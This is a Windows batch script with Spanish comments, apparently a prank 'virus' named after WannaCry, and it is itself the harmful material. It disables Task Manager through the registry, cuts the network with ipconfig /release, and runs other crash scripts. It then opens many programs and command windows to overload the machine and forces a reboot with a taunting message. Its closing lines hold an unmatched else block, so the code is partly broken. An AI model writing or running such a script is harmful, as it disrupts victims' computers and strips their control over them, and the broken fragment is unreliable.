@echo off
REM NOTEPAD XD
TIMEOUT 4
:--------------------------------------
REM Carpetas

md C:\WanaCry
md C:\WanaCry\msgspam
:--------------------------------------
REM MD Crash
start CrashMD.bat
:--------------------------------------
REM Copiar
 
copy "I:\asd\New Virusss\msgspam" C:\WanaCry\msgspam
:--------------------------------------
REM Sin wifi
 
ipconfig /release
:--------------------------------------
REM Sacar Task Manager
 
Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
:--------------------------------------
REM Crasher 1

start winword
start mspaint
start notepad
start cmd
start explorer
start control
start calc
:--------------------------------------
REM Crasher 2
 
start
start
start
start
start
start
start
start
:--------------------------------------
REM Crasher 3
 
start msgspam
:--------------------------------------
REM Crasher 4
 
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
start crash
:--------------------------------------
REM Apagar
 
 

		start shutdown.exe /r /t 30 /c "TE DIJE QUE NO LO EJECUTARAS."
	) else (
		echo.TE DIJE QUE NO LO ABRAS.
	)

	echo.
	echo.Press any key to continue . . .
	pause>nul
